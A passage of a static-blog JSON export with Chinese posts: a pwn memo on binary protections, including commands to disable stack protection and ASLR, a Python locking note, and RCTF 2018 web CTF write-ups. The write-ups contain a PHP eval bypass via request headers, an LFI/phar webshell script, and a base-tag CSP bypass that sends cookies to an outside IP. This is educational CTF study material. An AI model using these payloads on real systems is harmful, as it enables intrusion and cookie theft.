executables）。这样使得在利用缓冲溢出和移动操作系统中存在的其他内存崩溃缺陷时采用面向返回的编程（return-oriented programming）方法变得难得多。\n\n   liunx下关闭PIE的命令如下：\n\n   > sudo -s echo 0 > /proc/sys/kernel/randomize_va_space \n\n5. RELPO\n\n   设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对GOT（Global Offset Table）攻击。 \n\n## gdb中print和x的区别\n\nprint 就是打印变量（参数是什么，就打印什么），x但因给定变量代表的内存地址里的值（x后边的参数是地址值，打印的是地址所在内存单元的值）。比如:\n\n> p/x *$rax                                     ; \\$1=0x41414141 \n>\n> x/x $rax                                       ;\\$2=0x41\n\n差不多，区别在于打印出来的字节多少而已。\n\n","source":"_posts/pwn备忘录.md","raw":"---\ntitle: pwn备忘录\ndate: 2018-05-09 20:55:11\ntags:\n---\n\n## checksec检测到的保护机制\n\n1. cannary  (栈保护)\n\n   栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让shellcode能够得到执行。当启用栈保护后，函数开始执行的时候会先往栈里插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。在Linux中我们将cookie信息称为canary。 \n\n   gcc选项: \n\n   * gcc4.2版本-fstack-protector和-fstack-protector-all编译参数开启栈保护功能，4.9新增了-fstack-protector-strong编译参数让保护的范围更广。 \n   * -fno-stack-protector 不开启栈保护 \n\n   > gcc -fno-stack-protector -o test test.c  //禁用栈保护 \n   >\n   > gcc -fstack-protector -o test test.c   //启用堆栈保护，不过只为局部变量中含有 char 数组的函数插入保护代码 \n   >\n   > gcc -fstack-protector-all -o test test.c //启用堆栈保护，为所有函数插入保护代码 \n\n2. fortify\n\n   它其实和栈保护都是gcc的新的为了增强保护的一种机制，防止缓冲区溢出攻击。由于并不是太常见，也没有太多的了解。\n\n3. NX(windows下叫 DEP)\n\n   NX（DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。 \n\n   gcc编译器默认开启了NX选项，如果需要关闭NX选项，可以给gcc编译器添加-z execstack参数。 \n\n4. PIE(windows下ASLR)（address space layout randomization）\n\n   一般情况下NX（Windows平台上称其为DEP）和地址空间分布随机化（ASLR）会同时工作。 \n\n   > 0 - 表示关闭进程地址空间随机化。 \n   >\n   > 1 - 表示将mmap的基址，stack和vdso页面随机化。 \n   >\n   > 2 - 表示在1的基础上增加栈（heap）的随机化。 \n\n   可以防范基于Ret2libc方式的针对DEP的攻击。ASLR和DEP配合使用，能有效阻止攻击者在堆栈上运行恶意代码。\n\n   Built as PIE：位置独立的可执行区域（position-independent executables）。这样使得在利用缓冲溢出和移动操作系统中存在的其他内存崩溃缺陷时采用面向返回的编程（return-oriented programming）方法变得难得多。\n\n   liunx下关闭PIE的命令如下：\n\n   > sudo -s echo 0 > /proc/sys/kernel/randomize_va_space \n\n5. RELPO\n\n   设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对GOT（Global Offset Table）攻击。 \n\n## gdb中print和x的区别\n\nprint 就是打印变量（参数是什么，就打印什么），x但因给定变量代表的内存地址里的值（x后边的参数是地址值，打印的是地址所在内存单元的值）。比如:\n\n> p/x *$rax                                     ; \\$1=0x41414141 \n>\n> x/x $rax                                       ;\\$2=0x41\n\n差不多，区别在于打印出来的字节多少而已。\n\n","slug":"pwn备忘录","published":1,"updated":"2018-06-25T00:45:33.208Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjity3jpo000qly4jlrl4mo4o","content":"<h2 id=\"checksec检测到的保护机制\"><a href=\"#checksec检测到的保护机制\" class=\"headerlink\" title=\"checksec检测到的保护机制\"></a>checksec检测到的保护机制</h2><ol>\n<li><p>cannary  (栈保护)</p>\n<p>栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让shellcode能够得到执行。当启用栈保护后，函数开始执行的时候会先往栈里插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。在Linux中我们将cookie信息称为canary。 </p>\n<p>gcc选项: </p>\n<ul>\n<li>gcc4.2版本-fstack-protector和-fstack-protector-all编译参数开启栈保护功能，4.9新增了-fstack-protector-strong编译参数让保护的范围更广。 </li>\n<li>-fno-stack-protector 不开启栈保护 </li>\n</ul>\n<blockquote>\n<p>gcc -fno-stack-protector -o test test.c  //禁用栈保护 </p>\n<p>gcc -fstack-protector -o test test.c   //启用堆栈保护，不过只为局部变量中含有 char 数组的函数插入保护代码 </p>\n<p>gcc -fstack-protector-all -o test test.c //启用堆栈保护，为所有函数插入保护代码 </p>\n</blockquote>\n</li>\n<li><p>fortify</p>\n<p>它其实和栈保护都是gcc的新的为了增强保护的一种机制，防止缓冲区溢出攻击。由于并不是太常见，也没有太多的了解。</p>\n</li>\n<li><p>NX(windows下叫 DEP)</p>\n<p>NX（DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。 </p>\n<p>gcc编译器默认开启了NX选项，如果需要关闭NX选项，可以给gcc编译器添加-z execstack参数。 </p>\n</li>\n<li><p>PIE(windows下ASLR)（address space layout randomization）</p>\n<p>一般情况下NX（Windows平台上称其为DEP）和地址空间分布随机化（ASLR）会同时工作。 </p>\n<blockquote>\n<p>0 - 表示关闭进程地址空间随机化。 </p>\n<p>1 - 表示将mmap的基址，stack和vdso页面随机化。 </p>\n<p>2 - 表示在1的基础上增加栈（heap）的随机化。 </p>\n</blockquote>\n<p>可以防范基于Ret2libc方式的针对DEP的攻击。ASLR和DEP配合使用，能有效阻止攻击者在堆栈上运行恶意代码。</p>\n<p>Built as PIE：位置独立的可执行区域（position-independent executables）。这样使得在利用缓冲溢出和移动操作系统中存在的其他内存崩溃缺陷时采用面向返回的编程（return-oriented programming）方法变得难得多。</p>\n<p>liunx下关闭PIE的命令如下：</p>\n<blockquote>\n<p>sudo -s echo 0 &gt; /proc/sys/kernel/randomize_va_space </p>\n</blockquote>\n</li>\n<li><p>RELPO</p>\n<p>设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对GOT（Global Offset Table）攻击。 </p>\n</li>\n</ol>\n<h2 id=\"gdb中print和x的区别\"><a href=\"#gdb中print和x的区别\" class=\"headerlink\" title=\"gdb中print和x的区别\"></a>gdb中print和x的区别</h2><p>print 就是打印变量（参数是什么，就打印什么），x但因给定变量代表的内存地址里的值（x后边的参数是地址值，打印的是地址所在内存单元的值）。比如:</p>\n<blockquote>\n<p>p/x *$rax                                     ; \\$1=0x41414141 </p>\n<p>x/x $rax                                       ;\\$2=0x41</p>\n</blockquote>\n<p>差不多，区别在于打印出来的字节多少而已。</p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"checksec检测到的保护机制\"><a href=\"#checksec检测到的保护机制\" class=\"headerlink\" title=\"checksec检测到的保护机制\"></a>checksec检测到的保护机制</h2><ol>\n<li><p>cannary  (栈保护)</p>\n<p>栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让shellcode能够得到执行。当启用栈保护后，函数开始执行的时候会先往栈里插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。在Linux中我们将cookie信息称为canary。 </p>\n<p>gcc选项: </p>\n<ul>\n<li>gcc4.2版本-fstack-protector和-fstack-protector-all编译参数开启栈保护功能，4.9新增了-fstack-protector-strong编译参数让保护的范围更广。 </li>\n<li>-fno-stack-protector 不开启栈保护 </li>\n</ul>\n<blockquote>\n<p>gcc -fno-stack-protector -o test test.c  //禁用栈保护 </p>\n<p>gcc -fstack-protector -o test test.c   //启用堆栈保护，不过只为局部变量中含有 char 数组的函数插入保护代码 </p>\n<p>gcc -fstack-protector-all -o test test.c //启用堆栈保护，为所有函数插入保护代码 </p>\n</blockquote>\n</li>\n<li><p>fortify</p>\n<p>它其实和栈保护都是gcc的新的为了增强保护的一种机制，防止缓冲区溢出攻击。由于并不是太常见，也没有太多的了解。</p>\n</li>\n<li><p>NX(windows下叫 DEP)</p>\n<p>NX（DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。 </p>\n<p>gcc编译器默认开启了NX选项，如果需要关闭NX选项，可以给gcc编译器添加-z execstack参数。 </p>\n</li>\n<li><p>PIE(windows下ASLR)（address space layout randomization）</p>\n<p>一般情况下NX（Windows平台上称其为DEP）和地址空间分布随机化（ASLR）会同时工作。 </p>\n<blockquote>\n<p>0 - 表示关闭进程地址空间随机化。 </p>\n<p>1 - 表示将mmap的基址，stack和vdso页面随机化。 </p>\n<p>2 - 表示在1的基础上增加栈（heap）的随机化。 </p>\n</blockquote>\n<p>可以防范基于Ret2libc方式的针对DEP的攻击。ASLR和DEP配合使用，能有效阻止攻击者在堆栈上运行恶意代码。</p>\n<p>Built as PIE：位置独立的可执行区域（position-independent executables）。这样使得在利用缓冲溢出和移动操作系统中存在的其他内存崩溃缺陷时采用面向返回的编程（return-oriented programming）方法变得难得多。</p>\n<p>liunx下关闭PIE的命令如下：</p>\n<blockquote>\n<p>sudo -s echo 0 &gt; /proc/sys/kernel/randomize_va_space </p>\n</blockquote>\n</li>\n<li><p>RELPO</p>\n<p>设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对GOT（Global Offset Table）攻击。 </p>\n</li>\n</ol>\n<h2 id=\"gdb中print和x的区别\"><a href=\"#gdb中print和x的区别\" class=\"headerlink\" title=\"gdb中print和x的区别\"></a>gdb中print和x的区别</h2><p>print 就是打印变量（参数是什么，就打印什么），x但因给定变量代表的内存地址里的值（x后边的参数是地址值，打印的是地址所在内存单元的值）。比如:</p>\n<blockquote>\n<p>p/x *$rax                                     ; \\$1=0x41414141 </p>\n<p>x/x $rax                                       ;\\$2=0x41</p>\n</blockquote>\n<p>差不多，区别在于打印出来的字节多少而已。</p>\n"},{"title":"pwn基础栈溢出","date":"2018-06-05T07:34:04.000Z","_content":"\n","source":"_posts/pwn基础栈溢出.md","raw":"---\ntitle: pwn基础栈溢出\ndate: 2018-06-05 15:34:04\ntags:\n---\n\n","slug":"pwn基础栈溢出","published":1,"updated":"2018-06-08T10:08:03.405Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjity3jpp000tly4j6bvd2wcf","content":"","site":{"data":{}},"excerpt":"","more":""},{"title":"python多线程和lock和Rlock","date":"2018-06-14T09:02:12.000Z","_content":"\n在threading模块中，定义两种类型的琐：threading.Lock和threading.RLock。\n\nRLock允许在同一线程中被多次acquire。而Lock却不允许这种情况。注意：如果使用RLock，那么acquire和release必须成对出现，即调用了n次acquire，必须调用n次的release才能真正释放所占用的琐。\n\nrlock只能在同一个线程acquire和release\n\nlock可以在不同的线程acquire和release\n\nrlock的作用: 在递归程序中，可能会需要重复的acuqire,release，这时候，就必须要使用rlock。","source":"_posts/python多线程和lock和Rlock.md","raw":"---\ntitle: python多线程和lock和Rlock\ndate: 2018-06-14 17:02:12\ntags:\n---\n\n在threading模块中，定义两种类型的琐：threading.Lock和threading.RLock。\n\nRLock允许在同一线程中被多次acquire。而Lock却不允许这种情况。注意：如果使用RLock，那么acquire和release必须成对出现，即调用了n次acquire，必须调用n次的release才能真正释放所占用的琐。\n\nrlock只能在同一个线程acquire和release\n\nlock可以在不同的线程acquire和release\n\nrlock的作用: 在递归程序中，可能会需要重复的acuqire,release，这时候，就必须要使用rlock。","slug":"python多线程和lock和Rlock","published":1,"updated":"2018-06-14T09:05:03.249Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjity3jpr000vly4jk78bhysq","content":"<p>在threading模块中，定义两种类型的琐：threading.Lock和threading.RLock。</p>\n<p>RLock允许在同一线程中被多次acquire。而Lock却不允许这种情况。注意：如果使用RLock，那么acquire和release必须成对出现，即调用了n次acquire，必须调用n次的release才能真正释放所占用的琐。</p>\n<p>rlock只能在同一个线程acquire和release</p>\n<p>lock可以在不同的线程acquire和release</p>\n<p>rlock的作用: 在递归程序中，可能会需要重复的acuqire,release，这时候，就必须要使用rlock。</p>\n","site":{"data":{}},"excerpt":"","more":"<p>在threading模块中，定义两种类型的琐：threading.Lock和threading.RLock。</p>\n<p>RLock允许在同一线程中被多次acquire。而Lock却不允许这种情况。注意：如果使用RLock，那么acquire和release必须成对出现，即调用了n次acquire，必须调用n次的release才能真正释放所占用的琐。</p>\n<p>rlock只能在同一个线程acquire和release</p>\n<p>lock可以在不同的线程acquire和release</p>\n<p>rlock的作用: 在递归程序中，可能会需要重复的acuqire,release，这时候，就必须要使用rlock。</p>\n"},{"title":"rctf2018学习笔记","date":"2018-05-22T06:35:41.000Z","password":654321,"_content":"\n# Web\n\n<!--more-->\n\n赛后总结，没做过题目\n\n## r-cursive\n\n源代码:\n\n```\n<?php\n$token = sha1($_SERVER['REMOTE_ADDR']);\n$dir = '../sandbox/'.$token.'/';\nis_dir($dir) ?: mkdir($dir);\nis_file($dir.'index.php') ?: file_put_contents($dir.'index.php', str_replace('#SHA1#', $token, file_get_contents('./template')));\nswitch($_GET['action'] ?: ''){\n    case 'go':\n        header('Location: http://'.$token.'.sandbox.r-cursive.ml:1337/');\n        break;\n    case 'reset':\n        system('rm -rf '.$dir);\n        break;\n    default:\n        show_source(__FILE__);\n}\n?>\n<style>code{font-family: Segoe Script, Brush Script MT, cursive; font-size: 1.337em;}</style>\n```\n\ntemplate:\n\n```\n<?php\nsha1($_SERVER['REMOTE_ADDR']) === '#SHA1#' ?: die();\n';' === preg_replace('/[^\\W_]+\\((?R)?\\)/', NULL, $_GET['cmd']) ? eval($_GET['cmd']) : show_source(__FILE__);\n```\n\nhttp://589bf872527b686d94b4448c8ea3aed4761eaddc.sandbox.r-cursive.ml:1337/:\n\n```\n<?php\nsha1($_SERVER['REMOTE_ADDR']) === '589bf872527b686d94b4448c8ea3aed4761eaddc' ?: die();\n';' === preg_replace('/[^\\W_]+\\((?R)?\\)/', NULL, $_GET['cmd']) ? eval($_GET['cmd']) : show_source(__FILE__);\n```\n\n```\n?cmd=print(readdir(opendir(getcwd()))); 可以列目录\n?cmd=print(readfile(readdir(opendir(getcwd())))); 读文件\n?cmd=print(dirname(dirname(getcwd()))); print出/var/www\n```\n\n翻阅文档找到`getallheaders()`函数，会返回所有的http请求头，因为header可控，所以可执行任意命令了\n?cmd=print(end(getallheaders()));\n\n```\nGET /?cmd=eval(implode(getallheaders())); HTTP/1.1\nHost: 589bf872527b686d94b4448c8ea3aed4761eaddc.sandbox.r-cursive.ml\ncmd: phpinfo(); //\n```\n\n![1526973311681](/images/rctf/1526973311681.png)\n\n这里是利用auto_prepend来载入sandbox下的init.php来设置沙盒的open_basedir。\n\n```\nYou can use auto_prepend option in php.ini to supply script that will be executed first. There you can setup open_basedir via ini_set() function based on contents of $_SERVER array.\nanswered May 10 '13 at 17:21\ngmsalex\n20816\nYeah, something like this could do it: ini_set('open_basedir',\"/var/www/hosts/$hostname/:/tmp/\"); – Sunry Feb 9 at 1:29\n```\n\n不修改host:\n\n```\nGET /?cmd=eval(end(getallheaders())); HTTP/1.1\nHost: 71aabdeb3d708872c6e00e066ae48b2669834df7.sandbox.r-cursive.ml:1337\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.9\nConnection: close\ncookie: echo ini_get('open_basedir');\n```\n\n```\nHTTP/1.1 200 OK\nDate: Tue, 22 May 2018 07:25:09 GMT\nServer: Apache/2.4.10 (Debian)\nX-Powered-By: PHP/5.6.36\nContent-Length: 64\nConnection: close\nContent-Type: text/html; charset=UTF-8\n\n/var/www/sandbox/71aabdeb3d708872c6e00e066ae48b2669834df7/:/tmp/\n```\n\n修改host:\n\n```\nGET /?cmd=eval(end(getallheaders())); HTTP/1.1\nHost: .sandbox.r-cursive.ml:1337\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.9\nConnection: close\ncookie: echo ini_get('open_basedir');\n```\n\n```\nHTTP/1.1 403 Forbidden\nDate: Tue, 22 May 2018 07:25:36 GMT\nServer: Apache/2.4.10 (Debian)\nContent-Length: 298\nConnection: close\nContent-Type: text/html; charset=iso-8859-1\n\n<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">\n<html><head>\n<title>403 Forbidden</title>\n</head><body>\n<h1>Forbidden</h1>\n<p>You don't have permission to access /\non this server.<br />\n</p>\n<hr>\n<address>Apache/2.4.10 (Debian) Server at .sandbox.r-cursive.ml Port 1337</address>\n</body></html>\n```\n\n报错，403，这是由于sandbox目录下只有init.php，没有index.php的缘故。我们访问init.php试试，200,没有报错。说明open_basedir已经发生变化。\n\n```\nGET /init.php?cmd=eval(end(getallheaders())); HTTP/1.1\nHost: .sandbox.r-cursive.ml:1337\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.9\nConnection: close\ncookie: echo ini_get('open_basedir');\n```\n\n```\nHTTP/1.1 200 OK\nDate: Tue, 22 May 2018 07:26:20 GMT\nServer: Apache/2.4.10 (Debian)\nX-Powered-By: PHP/5.6.36\nContent-Length: 0\nConnection: close\nContent-Type: text/html; charset=UTF-8      \n```\n\ngetflag:\n\n```\nGET /71aabdeb3d708872c6e00e066ae48b2669834df7/index.php?cmd=eval(end(getallheaders())); HTTP/1.1\nHost: .sandbox.r-cursive.ml:1337\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.9\nConnection: close\ncookie: echo ini_get('open_basedir');var_dump(file_get_contents(\"/var/www/sandbox/init.php\"));\n```\n\n```\nHTTP/1.1 200 OK\nDate: Tue, 22 May 2018 06:51:10 GMT\nServer: Apache/2.4.10 (Debian)\nX-Powered-By: PHP/5.6.36\nVary: Accept-Encoding\nContent-Length: 186\nConnection: close\nContent-Type: text/html; charset=UTF-8\n\n/var/www/sandbox/:/tmp/string(148) \"<?php\n    ini_set(\"open_basedir\", $_SERVER['DOCUMENT_ROOT'].\"/:/tmp/\");\n    // flag: RCTF{apache_mod_vhost_alias_should_be_configured_correctly}\n?>\n\"\n```\n\n## Backdoor\n\n![1526992722365](/images/rctf/1526992722365.png)\n\n根据contrab.sh,我们可以得到两个链接：\n\n> http://backdoor.2018.teamrois.cn/post.php?action=upload\n>\n> http://backdoor.2018.teamrois.cn/post.php?action=debugging&count=$debuggers\n\n打开首页，查看源码，得到aaencode之后的js代码:\n\n解密网址:`https://tool.zcmzcm.org/aadecode`\n\n```\ndocument.loginform.onsubmit = function (e) { \n\te.preventDefault()\n\tdocument.getElementById('wp-submit').disabled = 'disabled'\n\tsetTimeout(function () {\n\t\tdocument.getElementById('wp-submit').removeAttribute('disabled')\n\t\talert('Login failed')\n\t\t\"What? Need hint?\"\n\t\t\"index.php is a hint!\"\n\t}, 3000)\n}\n```\n\n说明，不用登录。\n\n查看post.php，发现可能存在LFI。\n\nindex.php,没啥用\n\n> http://backdoor.2018.teamrois.cn/post.php?action=php://filter/read=convert.base64-encode/resource=index\n\npost.php\n\n```\n<?php\nerror_reporting(0);\ninclude $_GET['action'] . '.php';\n```\n\nuploa.php\n\n```\n<?php\nif (!isset($_FILES['file'])) exit;\n$file = $_FILES['file'];\n$zip = new ZipArchive();\nif (true !== $zip->open($file['tmp_name'])) {\n\techo 'No a valid zip';\n\texit;\n}\nif (false === $zip->getFromName('tmp/random.txt')) {\n\techo 'No file';\n\texit;\n}\n\n$dest = 'uploads/' . md5($_SERVER['REMOTE_ADDR']) . hash('sha256', file_get_contents($file['tmp_name'])) . '.zip';\nmove_uploaded_file($file['tmp_name'], $dest);\necho 'Saved into ' . $dest;\n```\n\n利用zip://或者phar://包含。\n\n```python\nimport requests\n\ns = \"Saved into \"\npost_url = \"http://backdoor.2018.teamrois.cn/post.php?action=upload\"\nzip_file = open(\"tmp.zip\",\"rb\")\nupload_file = {'file':zip_file}\nr = requests.post(post_url,files=upload_file)\ndest = r.text[len(s):]\nshell_url = \"http://backdoor.2018.teamrois.cn/post.php?action=phar://\"+ dest + \"/evil\"\nprint(\"[*] shell url: \" + shell_url)\nwhile  True:\n    command = input(\"command: \")\n    payload = {'chybeta': 'system(\"%s\");' % command}\n    r = requests.get(shell_url,params=payload)\n    print(r.text)\n```\n\n## r-blog\n\ntitle:        \"<>1\"\n\ncontent: \"<>1\"\n\n结果：\n\n```\n\n<!doctype html>\n<html lang=\"en\">\n<head>\n\t<meta charset=\"utf-8\">\n\t<meta name=\"viewport\" content=\"width=device-width, initial-scale=1, shrink-to-fit=no\">\n\t<link rel=\"stylesheet\" href=\"/assets/css/bootstrap.min.css\">\n\t<link rel=\"stylesheet\" href=\"/assets/css/style.css\">\n\t<link href=\"https://fonts.googleapis.com/css?family=Titillium+Web\" rel=\"stylesheet\">\n\t<title>rBlog 2018</title>\n</head>\n<body>\n<div class=\"container mt-5\">\n\t<div class=\"card\">\n\t\t\t\t<div class=\"card-body\">\n\t\t\t<h2 class=\"card-title\"><>1</h2>\n\t\t\t<p class=\"card-text\">&lt;&gt;2</p>\n\t\t</div>\n\t</div>\n</div>\n<script nonce=\"090c154a21d0fdf5809aff4586fe1eed\" src=\"/assets/js/jquery.min.js\"></script>\n</body>\n</html>\n```\n\ntitle没有过滤，content过滤。\n\ncsp如下:\n\n```\nX-Frame-Options: DENY\nContent-Security-Policy: default-src 'none'; script-src 'nonce-3ae08923a2654e27a3734f7876a5abe0'; frame-src https://www.google.com/recaptcha/; style-src 'self' 'unsafe-inline' fonts.googleapis.com; font-src fonts.gstatic.com; img-src 'self'\n```\n\n我们看到jquery.min.js是相对地址，并且base-uri没有在csp中指定。\n\n所以payload如下:\n\ntitle: `<base href =\"http://【my_server】/\">`\n\ncontent: 随意\n\n在字节的vps上添加jquery.min.js，网址:           `http://[my_server]/assets/js/jquery.min.js`\n\njquery.min.js的内容：\n\n```\nwindow.location.href=\"http://123.207.90.143?\"+document.cookie;\n```\n\n最终结果:\n\n```\n115.159.200.107 - - [22/May/2018:21:39:02 +0800] \"GET /?flag=RCTF{why_the_heck_no_mimetype_for_webp_in_apache2_in_8012};%20hint_for_rBlog_Rev.2=http://rblog.2018.teamrois.cn/blog.php/52c533a30d8129ee4915191c57965ef4c7718e6d HTTP/1.1\" 200 15 \"http://rblog.2018.teamrois.cn/\" \"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/66.0.3359.181 Safari/537.36\"\n\n```\n\n## amp\n\npayload:\n\n> http://amp.2018.teamrois.cn?name=<amp-pixel src=\"https://123.207.90.143:1234/pixel?clientId=CLIENT_ID(FLAG)\"></amp-pixel>\n\n```\n[root@VM_89_224_redhat ~]# nc -lvv 1234\nNcat: Version 6.40 ( http://nmap.org/ncat )\nNcat: Listening on :::1234\nNcat: Listening on 0.0.0.0:1234\nNcat: Connection from 106.120.206.166.\nNcat: Connection from 106.120.206.166:64053.\n\u0016\u0003\u0001\u0002\u0001\u0001�\u0003\u0003�Y���8۲Y�=����6���km����\n                                 ��A It+z���^�vY�$���,�\u00183�'�����*K�Zp\"jj\u0013\u0001\u0013\u0002\u0013\u0003�+�/�,�0̨̩�\u0013�\u0014��/5\n\u0014\u0012\u0004\u0004\u0004\u0001\u0006\u0006\u0001\u0002\u0001\u0001\u0012\u0010\n              \u0002hhttp/1.1uP\n                          \u0002\u00013+)jj\u0001\u001d �ZaV>WB�~\u0013���|�Z��4KM�������Et~-\u0002\u0001\u0001+\n\n��\u0017\u0003\u0003\u0003\u0002\u0003\u0001\n\n```\n\nwriteup:\n\n>  https://github.com/zsxsoft/my-rctf-2018/tree/master/amp\n\n注意，我这里是乱码的原因是，我直接监听1234端口，并不支持ssl。\n\n\n\n","source":"_posts/rctf2018学习笔记.md","raw":"---\ntitle: rctf2018学习笔记\ndate: 2018-05-22 14:35:41\ntags:\npassword: 654321\n---\n\n# Web\n\n<!--more-->\n\n赛后总结，没做过题目\n\n## r-cursive\n\n源代码:\n\n```\n<?php\n$token = sha1($_SERVER['REMOTE_ADDR']);\n$dir = '../sandbox/'.$token.'/';\nis_dir($dir) ?: mkdir($dir);\nis_file($dir.'index.php') ?: file_put_contents($dir.'index.php', str_replace('#SHA1#', $token, file_get_contents('./template')));\nswitch($_GET['action'] ?: ''){\n    case 'go':\n        header('Location: http://'.$token.'.sandbox.r-cursive.ml:1337/');\n        break;\n    case 'reset':\n        system('rm -rf '.$dir);\n        break;\n    default:\n        show_source(__FILE__);\n}\n?>\n<style>code{font-family: Segoe Script, Brush Script MT, cursive; font-size: 1.337em;}</style>\n```\n\ntemplate:\n\n```\n<?php\nsha1($_SERVER['REMOTE_ADDR']) === '#SHA1#' ?: die();\n';' === preg_replace('/[^\\W_]+\\((?R)?\\)/', NULL, $_GET['cmd']) ? eval($_GET['cmd']) : show_source(__FILE__);\n```\n\nhttp://589bf872527b686d94b4448c8ea3aed4761eaddc.sandbox.r-cursive.ml:1337/:\n\n```\n<?php\nsha1($_SERVER['REMOTE_ADDR']) === '589bf872527b686d94b4448c8ea3aed4761eaddc' ?: die();\n';' === preg_replace('/[^\\W_]+\\((?R)?\\)/', NULL, $_GET['cmd']) ? eval($_GET['cmd']) : show_source(__FILE__);\n```\n\n```\n?cmd=print(readdir(opendir(getcwd()))); 可以列目录\n?cmd=print(readfile(readdir(opendir(getcwd())))); 读文件\n?cmd=print(dirname(dirname(getcwd()))); print出/var/www\n```\n\n翻阅文档找到`getallheaders()`函数，会返回所有的http请求头，因为header可控，所以可执行任意命令了\n?cmd=print(end(getallheaders()));\n\n```\nGET /?cmd=eval(implode(getallheaders())); HTTP/1.1\nHost: 589bf872527b686d94b4448c8ea3aed4761eaddc.sandbox.r-cursive.ml\ncmd: phpinfo(); //\n```\n\n![1526973311681](/images/rctf/1526973311681.png)\n\n这里是利用auto_prepend来载入sandbox下的init.php来设置沙盒的open_basedir。\n\n```\nYou can use auto_prepend option in php.ini to supply script that will be executed first. There you can setup open_basedir via ini_set() function based on contents of $_SERVER array.\nanswered May 10 '13 at 17:21\ngmsalex\n20816\nYeah, something like this could do it: ini_set('open_basedir',\"/var/www/hosts/$hostname/:/tmp/\"); – Sunry Feb 9 at 1:29\n```\n\n不修改host:\n\n```\nGET /?cmd=eval(end(getallheaders())); HTTP/1.1\nHost: 71aabdeb3d708872c6e00e066ae48b2669834df7.sandbox.r-cursive.ml:1337\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.9\nConnection: close\ncookie: echo ini_get('open_basedir');\n```\n\n```\nHTTP/1.1 200 OK\nDate: Tue, 22 May 2018 07:25:09 GMT\nServer: Apache/2.4.10 (Debian)\nX-Powered-By: PHP/5.6.36\nContent-Length: 64\nConnection: close\nContent-Type: text/html; charset=UTF-8\n\n/var/www/sandbox/71aabdeb3d708872c6e00e066ae48b2669834df7/:/tmp/\n```\n\n修改host:\n\n```\nGET /?cmd=eval(end(getallheaders())); HTTP/1.1\nHost: .sandbox.r-cursive.ml:1337\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.9\nConnection: close\ncookie: echo ini_get('open_basedir');\n```\n\n```\nHTTP/1.1 403 Forbidden\nDate: Tue, 22 May 2018 07:25:36 GMT\nServer: Apache/2.4.10 (Debian)\nContent-Length: 298\nConnection: close\nContent-Type: text/html; charset=iso-8859-1\n\n<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 